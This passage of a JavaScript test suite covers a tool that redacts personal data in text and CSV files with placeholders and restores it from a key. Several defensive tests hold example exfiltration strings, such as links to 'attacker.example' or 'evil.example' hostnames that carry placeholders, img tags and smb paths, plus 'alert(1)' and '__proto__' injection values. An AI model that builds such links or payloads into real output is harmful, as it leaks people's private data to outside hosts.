  assert.deepEqual([...R.suggestNames("Merch Notes,Account Name", ALL)].map((x) => x.name), ["Merch Notes"]);
  // A name already on a list is never suggested, whatever survived.
  assert.deepEqual([...R.suggestNames("we told Dana", { ...ALL, lists: { PERSON: "Dana" } })], []);
  const csv = readFileSync(join(HERE, "..", "..", "data-pack", "crm", "opportunities-export-2026-11-02.csv"), "utf8");
  const rows = R.parseCsv(csv);
  const s = session();
  const out = R.redactCsv(csv, ALL, s, rows[0].map((h) => R.suggestAction(h)));
  const names = new Set(rows.slice(1).flatMap((r) => r[rows[0].indexOf("Contact Name")].split(/\s+/)));
  const sug = R.suggestNames(out, ALL, { csv: true });
  assert.ok(sug.length <= 12, `${sug.length} suggestions`);
  for (const x of sug) for (const w of x.name.split(" ")) assert.ok(!names.has(w), `${x.name} is a contact who should have been masked`);
});

test("suggesting is fast on a long run of capitalized words", () => {
  const t = Date.now();
  R.suggestNames("Alpha Beta ".repeat(20000) + "\n" + "we told Dana, ".repeat(10000), ALL);
  assert.ok(Date.now() - t < 2000, `took ${Date.now() - t} ms`);
});

test("a listed name is found however it is spaced: no-break, thin, doubled, wrapped, tabbed, or with an invisible character", () => {
  const opts = { ...ALL, lists: { COMPANY: "Best Byte", PRODUCT: "Falcon Pro" } };
  for (const sep of ["\u00A0", "\u2009", "\u202F", "  ", "\n", "\t", " \u200B"]) {
    assert.equal(R.redactText(`Best${sep}Byte signed; Falcon${sep}Pro ships.`, opts, session()), "[COMPANY-01] signed; [PRODUCT-01] ships.", JSON.stringify(sep));
  }
  // A full name spaced oddly is one name, not two parts: restore gives it back once.
  const s = session();
  const out = R.redactText("Rachel  Kim said.", { ...ALL, lists: { PERSON: "Rachel Kim" } }, s);
  assert.equal(out, "[PERSON-01] said.");
  assert.equal(R.restore(out, s.key).text, "Rachel Kim said.");
});

test("accents and apostrophes match however they are encoded", () => {
  const s = session();
  const opts = { ...ALL, lists: { PERSON: "José Núñez\nO'Neil Smith" } };
  assert.equal(R.redactText("José Núñez said".normalize("NFD"), opts, s), "[PERSON-01] said");
  assert.equal(R.redactText("O\u2019Neil Smith said, and O\u2019Neil agreed", opts, session()), "[PERSON-01] said, and [PERSON-01] agreed");
  // Typed in lower case, a name with an inner capital is still caught.
  assert.equal(R.redactText("O'Neil said", { ...ALL, lists: { PERSON: "o'neil smith" } }, session()), "[PERSON-01] said");
});

test("titles and suffixes typed with a name are not names of their own", () => {
  const opts = { ...ALL, lists: { PERSON: "Dr. Rachel Kim\nMarcus Webb Jr." } };
  assert.equal(R.redactText("Dr. Patel met Rachel; Jr. staff stayed.", opts, session()), "Dr. Patel met [PERSON-01]; Jr. staff stayed.");
});

test("an invisible character inside a word, and a list entry typed with a no-break space or a curly apostrophe, still match", () => {
  assert.equal(R.redactText("Be\u200Bst Byte signed", { ...ALL, lists: { COMPANY: "Best Byte" } }, session()), "[COMPANY-01] signed");
  assert.equal(R.redactText("Best Byte signed", { ...ALL, lists: { COMPANY: "Best\u00A0Byte" } }, session()), "[COMPANY-01] signed");
  assert.equal(R.redactText("O'Neil Smith said", { ...ALL, lists: { PERSON: "O\u2019Neil Smith" } }, session()), "[PERSON-01] said");
});

test("a masked spreadsheet value typed with a double space is still one value", () => {
  const out = R.redactCsv("Account,Notes\nBest  Byte,Talk to Best Byte\n", ALL, session(), ["mask", "keep"]);
  assert.equal(out.trim(), "Account,Notes\n[ACCOUNT-1],Talk to [ACCOUNT-1]");
});

test("a card after another number on the same line, and two cards in a row, are found", () => {
  assert.equal(R.redactText("SSN 123-45-6789 4012 8888 8888 1881", ALL, session()), "SSN [SSN-1] [CARD-1]");
  assert.equal(R.redactText("Dana 214-555-0125 4012 8888 8888 1881", ALL, session()), "Dana [PHONE-1] [CARD-1]");
  assert.equal(R.redactText("Qty 2 4012 8888 8888 1881", ALL, session()), "Qty 2 [CARD-1]");
  assert.equal(R.redactText("4111 1111 1111 1111 4012 8888 8888 1881", ALL, session()), "[CARD-1] [CARD-2]");
  assert.equal(R.redactText("Amex 3782 822463 10005 then 5555 5555 5555 4444", ALL, session()), "Amex [CARD-1] then [CARD-2]");
  // Still not a card: digits that only pass the checksum across a group boundary.
  assert.equal(R.redactText("Order 4111 1111 1111 1112 shipped.", ALL, session()), "Order 4111 1111 1111 1112 shipped.");
});

test("a phone number outside the US stops at the end of its line, and a trailing date or postcode is not part of it", () => {
  assert.equal(R.redactText("Tel: +33 1 42 68 53 00\n75008 Paris", ALL, session()), "Tel: [PHONE-1]\n75008 Paris");
  assert.equal(R.redactText("Call +44 20 7946 0958 2026 onward", ALL, session()), "Call [PHONE-1] 2026 onward");
});

test("a phone number outside the US never shares a placeholder with a US one; a (0) trunk digit is the same number", () => {
  const s = session();
  assert.equal(R.redactText("+45 32 12 34 56 and 453-212-3456", ALL, s), "[PHONE-1] and [PHONE-2]");
  assert.equal(R.restore("[PHONE-1] and [PHONE-2]", s.key).text, "+45 32 12 34 56 and 453-212-3456");
  assert.equal(R.redactText("+33 (0)1 42 68 53 00 or +33 1 42 68 53 00", ALL, session()), "[PHONE-1] or [PHONE-1]");
});

test("amounts are taken whole: other groupings, long decimals, size words in any case", () => {
  const on = { ...ALL, money: true };
  for (const a of ["€1.250.000", "€1.250.000,50", "$1,234.567", "$1,234.5678", "$0.12345", "$5 Billion", "12K Dollars", "usd 100", "100 Usd"]) {
    assert.equal(R.redactText(`Paid ${a} today`, on, session()), "Paid [AMOUNT-1] today", a);
  }
});

test("a link in capitals, and a phone number after a hyphen, are found", () => {
  assert.equal(R.redactText("See HTTPS://X.EXAMPLE/a and WWW.Dalton.example.", { ...ALL, url: true }, session()), "See [LINK-1] and [LINK-2].");
  assert.equal(R.redactText("Mobile-214-555-0125", ALL, session()), "Mobile-[PHONE-1]");
});

const GUARD_KEY = {
  tool: "redact-restore",
  version: 1,
  entries: [
    { placeholder: "[EMAIL-1]", value: "rachel@dalton.example", kind: "EMAIL" },
    { placeholder: "[PERSON-01]", value: "Rachel Kim", kind: "PERSON" },
    { placeholder: "[PERSON-02]", value: "Marcus Webb", kind: "PERSON" },
    { placeholder: "[COMPANY-01]", value: "ValuMart", kind: "COMPANY" },
    { placeholder: "[SSN-1]", value: "123-45-6789", kind: "SSN" },
  ],
};

test("restore leaves a placeholder anywhere an app could turn it into a request", () => {
  const left = [
    "//x.example/?e=[EMAIL-1]",
    "[1]: //x.example/c?e=[EMAIL-1]",
    "[ref]: <https://a.example/p? [EMAIL-1]>",
    "[ref]:\n  //x.example/[EMAIL-1]",
    '<img src="c/[PERSON-01]">',
    '<img\n  src="c/[PERSON-01]">',
    "![x](<https://a.example/p? [EMAIL-1]>)",
    "![x](/p(a) b [EMAIL-1])",
    "![x](/p\n[EMAIL-1])",
    "attacker.example/?u=[PERSON-01]",
    "10.0.0.5/[PERSON-01]",
    "file:///C:/x/[PERSON-01]",
    "\\\\host\\share\\[PERSON-01]",
    "smb://host/[PERSON-01]",
    "[COMPANY-01].evil.example",
    // Glued to the front of a domain: still a hostname under someone else's.
    "[COMPANY-01]-collect.evil.example/x",
    "[COMPANY-01]collect.evil.example",
    "[SSN-1]-x.evil.example",
    "see ?u=[PERSON-01]",
    "a&b=[PERSON-01]",
  ];
  for (const text of left) {
    const r = R.restore(text, GUARD_KEY);
    assert.equal(r.text, text, text);
    assert.equal(r.inLinks, 1, text);
  }
});

test("restore still puts real values back in ordinary text beside links", () => {
  const cases = [
    ["Owner: [PERSON-01].", "Owner: Rachel Kim."],
    ["[COMPANY-01]: Q3 notes\n  [PERSON-01]: called [COMPANY-01]", "ValuMart: Q3 notes\n  Rachel Kim: called ValuMart"],
    ["[PERSON-01](https://x.example/profile)", "Rachel Kim(https://x.example/profile)"],
    ["Leads: [PERSON-01]/[PERSON-02]", "Leads: Rachel Kim/Marcus Webb"],
    // One label after: the host is chosen by the real value, so no one else owns it.
    ["[COMPANY-01].com and [PERSON-01].Then", "ValuMart.com and Rachel Kim.Then"],
    ["[COMPANY-01]s. Then [COMPANY-01]s.csv", "ValuMarts. Then ValuMarts.csv"],
    ["If 2 < 3 then [PERSON-01] > 1", "If 2 < 3 then Rachel Kim > 1"],
    ["#[COMPANY-01] and [COMPANY-01], (see [PERSON-01])", "#ValuMart and ValuMart, (see Rachel Kim)"],
    ["x](y [EMAIL-1]\n\nNext: [PERSON-01]", "x](y [EMAIL-1]\n\nNext: Rachel Kim"],
  ];
  for (const [text, want] of cases) assert.equal(R.restore(text, GUARD_KEY).text, want, text);
});

test("a key with the same placeholder twice is not a key", () => {
  const twice = { ...GUARD_KEY, entries: [...GUARD_KEY.entries, { placeholder: "[PERSON-01]", value: "Someone Else", kind: "PERSON" }] };
  assert.equal(R.validateKey(twice), false);
  assert.equal(R.parseKey(JSON.stringify(twice)), null);
});

test("a second key never replaces one with placeholders that haven't been saved", () => {
  const other = { ...GUARD_KEY, entries: GUARD_KEY.entries.slice(0, 1) };
  assert.equal(R.keySwap(null, false, GUARD_KEY), "load");
  assert.equal(R.keySwap({ ...GUARD_KEY, entries: [] }, false, GUARD_KEY), "load");
  assert.equal(R.keySwap(GUARD_KEY, true, other), "load");
  assert.equal(R.keySwap(GUARD_KEY, false, other), "refuse");
  assert.equal(R.keySwap(GUARD_KEY, false, JSON.parse(JSON.stringify(GUARD_KEY))), "same");
});

test("a key may carry the profile it was made with; anything malformed in it refuses the whole key", () => {
  const entries = [{ placeholder: "[COMPANY-01]", value: "Best Byte", kind: "COMPANY" }];
  const key = (profile) => ({ tool: "redact-restore", version: 1, entries, profile });
  assert.equal(R.validateKey(key(undefined)), true, "older keys have no profile");
  assert.equal(R.validateKey(key({ lists: { COMPANY: "Best Byte" }, terms: "", options: { email: true, money: false }, columns: { "Contact Email": "drop", Stage: "keep" } })), true);
  for (const bad of [
    null, [], "x",
    { lists: { CLIENT: "x" } },
    { lists: { COMPANY: 3 } },
    { lists: ["COMPANY"] },
    { terms: 5 },
    { terms: "x".repeat(200001) },
    { options: { email: "yes" } },
    { options: { fetch: true } },
    { columns: { Notes: "delete" } },
    { columns: { ["h".repeat(501)]: "keep" } },
    { columns: Object.fromEntries(Array.from({ length: 5001 }, (_, i) => [`c${i}`, "keep"])) },
    { script: "alert(1)" },
    JSON.parse('{"__proto__": {"x": 1}}'),
  ]) assert.equal(R.validateKey(key(bad)), false, JSON.stringify(bad)?.slice(0, 80));
  // A header named like an object's own machinery is just a header.
  assert.equal(R.validateKey(key(JSON.parse('{"columns": {"__proto__": "drop", "constructor": "mask"}}'))), true);
});

test("profileOf saves the lists, the automatic finds and the column choices, and nothing else", () => {
  const p = R.profileOf(
    { lists: { COMPANY: "Best Byte", PERSON: "Rachel Kim" }, terms: "store 4471", email: true, phone: false, ssn: true, card: true, money: true, url: false, extra: "ignored" },
    new Map([["Contact Email", "drop"], ["Stage", "mask"], ["", "keep"], ["Weird", "explode"]]),
  );
  // Objects from the page's VM have another realm's prototypes: compare as JSON.
  assert.equal(JSON.stringify(Object.keys(p)), JSON.stringify(["lists", "terms", "options", "columns"]));
  assert.equal(p.lists.COMPANY, "Best Byte");
  assert.equal(p.lists.PRODUCT, "");
  assert.equal(p.terms, "store 4471");
  assert.equal(JSON.stringify(p.options), JSON.stringify({ email: true, phone: false, ssn: true, card: true, money: true, url: false }));
  assert.equal(JSON.stringify(p.columns), JSON.stringify({ "Contact Email": "drop", Stage: "mask" }));
  assert.equal(R.validateKey({ tool: "redact-restore", entries: [], profile: p }), true);
});

test("mergeLines adds what a list lacks and keeps what was typed", () => {
  assert.equal(R.mergeLines("", "Best Byte\nValuMart"), "Best Byte\nValuMart");
  assert.equal(R.mergeLines("Acme\nbest byte\n", "Best Byte\nValuMart\n\nValuMart"), "Acme\nbest byte\nValuMart");
  assert.equal(R.mergeLines("Acme", ""), "Acme");
  assert.equal(R.mergeLines("Rachel Kim | Rach", "Rachel Kim | Rach\nMarcus Webb"), "Rachel Kim | Rach\nMarcus Webb");
});
